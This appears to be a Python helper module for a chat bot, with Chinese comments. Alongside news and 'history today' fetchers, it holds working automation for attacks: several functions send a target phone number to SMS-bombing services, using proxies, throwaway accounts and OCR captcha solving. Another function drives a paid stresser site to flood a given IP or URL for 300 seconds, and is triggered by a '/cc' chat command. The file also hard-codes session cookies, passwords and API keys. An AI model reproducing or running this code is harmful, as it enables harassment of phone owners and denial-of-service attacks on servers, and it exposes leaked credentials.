import time
import ddddocr
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.service import Service
import random
import string
import requests
import re
import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
class MyMethods:
    def __init__(self):
        pass

# 判断是不是手机号
def is_phonenum(msg):
    if len(msg) == 11 and is_all_digits(msg):
        return True
    else:
        return False

# 判断字符串里的是否全为数字
def is_all_digits(string):

    for char in string:
        if not char.isdigit():
            return False

    return True

# 短信轰炸平台 猛虎
def dxhz_menghu(phonenum):
    hz_url = 'http://mehu.65n.icu/index/ajax/order/act/add.html'
    headers = {
        "cookie": "Let_IndexUsername=953777955; Let_IndexPassword=747a941d40a04442f4bb668de8772f1d; PHPSESSID=ec9065d35f2192dcd8d58175ed12557a; Hm_lvt_d97abf6d61c21d773f97835defbdef4e=1712252900,1712332022; Hm_lpvt_d97abf6d61c21d773f97835defbdef4e=1712332022",
    }
    data = {
        'phone': phonenum,
        'time': 10
    }

    try:
        rp = requests.post(url=hz_url, headers=headers, data=data,timeout=5)
    except:
        return '[猛虎平台]无法打开'
    try:
        msg = rp.json().get('msg')
    except:
        return '[猛虎平台]提交失败，订单已满'
    if '提交成功' in msg:
        return '[猛虎平台]提交成功，手机号为' + phonenum + '，时间10分钟'

    return '[猛虎平台]'+msg

# 短信轰炸平台 冰封
def dxhz_bingfeng(phonenum):
    try:
        service = Service('./chromedriver.exe')
        driver = webdriver.Chrome(service=service)
        driver.get('https://love666.link/index/index/login.html')
        wait = WebDriverWait(driver, 10)
        try:
            driver.find_element(By.ID, 'access').click()
        except:
            pass
        wait.until(EC.visibility_of_element_located((By.NAME, "username")))
        driver.find_element(By.NAME, 'username').send_keys('953777955')
        driver.find_element(By.NAME, 'password').send_keys('qweqweqwe')
        driver.find_element(By.XPATH, '/html/body/div/div/form/div[5]/button').click()

        wait.until(EC.visibility_of_element_located((By.NAME, "phone")))
        driver.find_element(By.NAME, 'phone').send_keys(phonenum)
        driver.find_element(By.NAME, 'time').send_keys('10')
        time.sleep(3)
        driver.find_element(By.XPATH,
                            '/html/body/div[1]/div[5]/div[2]/div[2]/div/div/div[1]/div/div[1]/form/div/div[3]/button').click()
        driver.quit()
        return '[冰封]提交成功'
    except:
        return '[冰封]提交失败'
    # try:
    #     headers = {
    #         "cookie": "Let_IndexUsername=953777955; Let_IndexPassword=747a941d40a04442f4bb668de8772f1d; guard=3056d46dHwzU; guardret=XNxYx/f892tZQePscjq3iI88mpxJV+mu00z6mkb5NMA=; PHPSESSID=6c55bf9a323c66a5da753d6a5a614973; Hm_lvt_d97abf6d61c21d773f97835defbdef4e=1712418167,1712475372; Hm_lpvt_d97abf6d61c21d773f97835defbdef4e=1712475372",
    #     }
    #     data = {
    #         'phone': phonenum,
    #         'time': 10
    #     }
    #     hz_url = 'http://love666.link/index/ajax/order/act/add.html'
    #     rp = requests.post(url=hz_url, headers=headers, data=data, timeout=5).text
    #     if 'click' not in rp:
    #         return f'[冰封平台]{rp}'
    #     else:
    #         service = Service('./chromedriver.exe')
    #         driver = webdriver.Chrome(service=service)
    #         login_url = "http://love666.link/index/index/login.html"
    #         driver.get(login_url)
    #         time.sleep(2)
    #         verify_button = driver.find_element(By.ID, 'access')
    #         verify_button.click()
    #         time.sleep(2)
    #         rp2 = requests.post(url=hz_url, headers=headers, data=data, timeout=5).text
    #         driver.quit()
    #         return f'[冰封平台]{rp2}'
    #     return '[冰封平台]起飞'
    # except:
    #     return '[冰封平台]发生错误'

# 在github上获取我自己爬的节点
def fanqiang():
    try:
        url = 'https://raw.githubusercontent.com/TryAgainC/9/main/tongyong/%E8%8A%82%E7%82%B9%E4%BF%A1%E6%81%AF.txt'
        jiedian = requests.get(url=url,timeout=10).text
    except:
        return '出了点问题，获取失败'

    return jiedian

# 查询历史上的今天(详细)
def histroy_today_news_detailed():
    try:
        appid = '1569025'
        sign = '15059bb145344250b9b43915d2bb8b40'
        url = f'https://route.showapi.com/119-42?showapi_appid={appid}&showapi_sign={sign}&needContent=1'

        histroy_today_list = requests.get(url=url,timeout=5).json().get('showapi_res_body').get('list')
        histroy_today = ''
        a = 1
        for i in histroy_today_list:
            histroy_today += f'[{str(a)}]:' + i['content'] +'\n' +'\n'
            a += 1

        return histroy_today
    except:
        return '出错了'


# 查询历史上的今天(简单)
def histroy_today_news_simple():
    try:
        appid = '1569025'
        sign = '15059bb145344250b9b43915d2bb8b40'
        url = f'https://route.showapi.com/119-42?showapi_appid={appid}&showapi_sign={sign}&needContent=1'

        histroy_today_list = requests.get(url=url,timeout=5).json().get('showapi_res_body').get('list')
        histroy_today = ''
        a = 1
        for i in histroy_today_list:

            histroy_today += f'[{str(a)}]:' + i['title'] +'\n' +'\n'
            a += 1

        return histroy_today
    except:
        return '出错了'


#每日简报
def today_news():
    try:
        apikey = '0c6a3a0a38c07de5900739f7212b277c'
        url = f'https://apis.tianapi.com/bulletin/index?key={apikey}'
        news = requests.get(url=url,timeout=5).json().get('result').get('list')
        str_news = ''
        a = 1
        for i in news:
            digest = i['digest']
            n = str(a)
            str_news += f'[{n}]: {digest}\n\n'
            a += 1
        return str_news
    except:
        return '出错了'

# 判断定时任务的时间到了没有
def is_ontime(h,m):
    current_time = datetime.datetime.now()
    hour = current_time.hour
    minute = current_time.minute
    if hour == h and minute == m :
        return True
    else:
        return False


def generate_number(num_digits=9):
    # 9位数的范围是从100,000,000到999,999,999
    range_start = 10**(num_digits - 1)
    range_end = (10**num_digits) - 1
    random_number = random.randint(range_start, range_end)
    return random_number


def generate_password():
    # 随机决定密码的前缀是两个还是三个字母
    prefix_length = random.choice([2,3])

    # 生成随机的字母前缀
    prefix = ''.join(random.choices(string.ascii_lowercase, k=prefix_length))

    # 生成5-8位的随机数字后缀
    suffix_length = random.randint(6, 8)
    suffix = ''.join(random.choices(string.digits, k=suffix_length))

    # 合并前缀和后缀，形成完整的密码
    password = prefix + suffix

    return password


def bianfu(phone):
    for i in range(5):
        try:
            # 创建随机账号密码
            usrName = generate_number()
            pwd = generate_password()

            # 获取代理ip
            # url_xiaoxiang = 'https://api.xiaoxiangdaili.com/ip/get?appKey=1095776986175262720&appSecret=RNiO642t&cnt=1&wt=text&method=https&city=&province='
            url_xiaoxiang = 'https://api.xiaoxiangdaili.com/ip/get?appKey=1095788822345961472&appSecret=OR76Uxa7&cnt=1&wt=text&method=https&city=&province='
            proxy_ip = requests.get(url=url_xiaoxiang).text

            # 设置代理ip
            proxy = Proxy()
            proxy.proxy_type = ProxyType.MANUAL
            # proxy.http_proxy = f"{proxy_ip}:{proxy_port}"
            proxy.http_prox = proxy_ip
            proxy.ssl_proxy = proxy_ip
            Chrome_options = webdriver.ChromeOptions()
            Chrome_options.add_argument(f"--proxy-server=http://{proxy_ip}")

            # url = 'https://www.ipuu.net/ipuu/user/getIP'
            #
            # proxys = {
            #     # 'https' : '42.236.73.11:45367'   117.147.96.22
            #     # 'https' : '42.236.82.20:45336'
            #     'https': proxy_ip
            # }
            #
            # print(requests.get(url=url, proxies=proxys).text)

            service = Service('./chromedriver.exe')
            driver = webdriver.Chrome(service=service, options=Chrome_options)
            driver.get('http://www.bfsms.xyz/')
            time.sleep(3)
            # 先看下有没有注册的按钮，有的话说明在登陆页面，先跳转到注册页面
            try:
                driver.find_element(By.ID, 'rg').click()
            except:
                pass

            driver.find_element(By.ID, 'userName').send_keys(usrName)
            driver.find_element(By.ID, 'password').send_keys(pwd)
            driver.find_element(By.ID, 'password2').send_keys(pwd)
            time.sleep(5)
            # 抓到验证码，并且截图
            driver.find_element(By.XPATH, '/html/body/div/div/div/div/form/div[4]/img').screenshot('code.png')
            time.sleep(1)
            # 用ddddocr来识别内容
            ocr = ddddocr.DdddOcr()
            with open('code.png', 'rb') as fp:
                image = fp.read()
            # 只保留后四位，拿到验证码传到catch
            catch = ocr.classification(image)[-4:]
            driver.find_element(By.ID, 'imagecode').send_keys(catch)
            time.sleep(3)
            driver.find_element(By.ID, 'reg').click()

            time.sleep(1)
            # 登陆

            driver.get(f'https://www.bfsms.xyz/weblogin?userName={usrName}&password={pwd}&loginType=login&type=sms1')
            time.sleep(3)
            driver.find_element(By.XPATH, '/html/body/div[3]/div/div[2]/div/button').click()
            driver.find_element(By.ID, 'phoneNumber').send_keys(phone)
            time.sleep(3)
            driver.find_element(By.ID, 'sendButton').click()
            time.sleep(3)
            driver.save_screenshot('msg.png')
            time.sleep(2)
            driver.quit()
            return True
        except:
            continue
    return False

def cc_attack(ip):
    username = '953777956'
    pwd = 'qweqweqwe'

    service = Service('./chromedriver.exe')
    driver = webdriver.Chrome(service=service)
    driver.implicitly_wait(10)
    driver.get('https://stresser.su/login')
    time.sleep(2)
    # 登陆
    driver.find_element(By.NAME, 'username').send_keys(username)
    driver.find_element(By.NAME, 'password').send_keys(pwd)
    driver.find_element(By.XPATH,
                        '//*[@id="root"]/div/div[2]/div/div/div/div/section/div/div[2]/form/div[3]/button').click()
    time.sleep(2)

    # 开始轰炸
    # 设置轰炸的信息
    driver.get('https://stresser.su/hub')
    time.sleep(1)
    driver.find_element(By.XPATH, '/html/body/div[3]/div/div/div[3]/button').click()
    time.sleep(1)
    driver.find_element(By.NAME, 'hub.0.host').send_keys(ip)
    time.sleep(1)
    # send_time = driver.find_element(By.NAME,'hub.0.time')
    send_time = driver.find_element(By.XPATH,
                                    '/html/body/div/div/div[3]/div/div/div[2]/div/section/div[2]/form/div[1]/div/div/div[2]/div/div/div[2]/div[1]/div/input[2]')
    # 将input框中的所有内容选中并删除
    # 方法1: 使用send_keys()方法
    send_time.send_keys(Keys.CONTROL, 'a')  # 全选
    send_time.send_keys(Keys.CONTROL, 'x')  # 剪切（在大多数浏览器中等同于删除）
    time.sleep(1)
    send_time.send_keys('300')
    time.sleep(2)

    # 提交轰炸按钮
    driver.find_element(By.XPATH,
                        '/html/body/div/div/div[3]/div/div/div[2]/div/section/div[2]/form/div[2]/div/div/button[3]').click()
    time.sleep(1)

    wait = 1
    # 提交轰炸之后，处理验证码
    for i in range(10):
        try:
            time.sleep(wait)
            click_send = driver.find_element(By.XPATH, '/html/body/div[3]/div/div/div[3]/button[1]')
            # 抓到验证码，并且截图
            driver.find_element(By.XPATH, '/html/body/div[3]/div/div/div[2]/div/div[1]/div/img').screenshot('code.png')
            time.sleep(1)
            # 用ddddocr来识别内容
            ocr = ddddocr.DdddOcr()
            with open('code.png', 'rb') as fp:
                image = fp.read()
            # 拿到验证码catch
            catch = ocr.classification(image)
            # 填入验证码
            send_catch = driver.find_element(By.NAME, 'captcha')
            send_catch.send_keys(Keys.CONTROL, 'a')  # 全选
            send_catch.send_keys(Keys.CONTROL, 'x')  # 剪切（在大多数浏览器中等同于删除）
            send_catch.send_keys(catch)
            # 点击提交
            click_send.click()
            time.sleep(2)
            wait = 7
            continue
        except:
            break
    driver.find_element(By.CLASS_NAME, 'accordion-button').screenshot('cc_msg.png')

    driver.quit()


def check_is_cc(keyword):
    pattern = '^/cc https?://?\S+'
    if re.match(pattern, keyword):
        return True
    else:
        return False

def change_cc_url(keyword):

    cc_url = keyword.replace("/cc ", "")
    return cc_url

